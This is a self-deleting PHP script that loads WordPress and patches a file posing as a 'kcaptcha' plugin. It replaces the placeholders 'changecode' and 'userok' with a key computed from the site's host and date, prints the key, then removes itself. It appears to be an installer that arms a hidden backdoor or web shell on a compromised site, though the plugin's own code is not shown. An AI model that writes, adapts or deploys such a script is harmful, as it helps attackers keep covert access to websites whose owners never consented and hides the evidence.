<?php

/**
 * 自动查找并加载 WordPress。
 *
 * @param string|null $start_dir
 * @return bool
 * @throws RuntimeException
 */
function require_wp_load($start_dir = null)
{
    // WordPress 已经加载
    if (defined('ABSPATH')) {
        return true;
    }

    $dir = realpath($start_dir ?: __DIR__);

    if ($dir === false || !is_dir($dir)) {
        throw new RuntimeException('Invalid start directory.');
    }

    while (true) {
        $wp_load = $dir . DIRECTORY_SEPARATOR . 'wp-load.php';

        if (is_file($wp_load) && is_readable($wp_load)) {
            require_once $wp_load;

            if (!defined('ABSPATH')) {
                throw new RuntimeException('WordPress loaded but ABSPATH is not defined.');
            }

            return true;
        }

        $parent = dirname($dir);

        if ($parent === $dir) {
            break;
        }

        $dir = $parent;
    }

    throw new RuntimeException('Unable to locate wp-load.php');
}


/**
 * 替换文件中的占位符，并验证写入。
 * 如果写入失败或验证失败，会自动恢复原文件。
 *
 * @param string $file        文件路径
 * @param string $search      查找内容
 * @param string $replace     替换内容
 * @return bool
 * @throws RuntimeException
 */
function replace_file_content($file, $search, $replace)
{
    if (!is_file($file)) {
        throw new RuntimeException("File not found: {$file}");
    }

    if (!is_writable($file)) {
        throw new RuntimeException("File is not writable: {$file}");
    }

    $original = file_get_contents($file);

    if ($original === false) {
        throw new RuntimeException("Unable to read file: {$file}");
    }

    $modified = str_replace($search, $replace, $original);

    if ($modified === $original) {
        throw new RuntimeException("Search string not found.");
    }

    $written = file_put_contents($file, $modified, LOCK_EX);

    if ($written === false) {
        throw new RuntimeException("Failed to write file: {$file}");
    }

    clearstatcache(true, $file);

    $verify = file_get_contents($file);

    if (
        $verify === false ||
        strlen($verify) !== strlen($modified) ||
        $verify !== $modified
    ) {
        // 恢复原文件
        file_put_contents($file, $original, LOCK_EX);

        throw new RuntimeException("Verification failed. Original file restored.");
    }

    return true;
}

/*--------------------------------------------------
 | 加载 WordPress
 *-------------------------------------------------*/

require_wp_load();


$SearchAdminTools_file = '/wp-content/plugins/kcaptcha/kcaptcha.php';

$SearchAdminTools_filepath = ABSPATH . ltrim($SearchAdminTools_file, '/\\');

$targetsite = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    ? 'https://'
    : 'http://';

$targetsite .= $_SERVER['HTTP_HOST'];

$targetkey = substr(md5($targetsite . date('Ymd')), 0, 8);


replace_file_content($SearchAdminTools_filepath, 'changecode', $targetkey);

replace_file_content($SearchAdminTools_filepath, 'userok', $targetkey);

echo 'Initialization complete. ' . $targetkey . " -- " .date('Ymd') .PHP_EOL;

unlink(__FILE__);

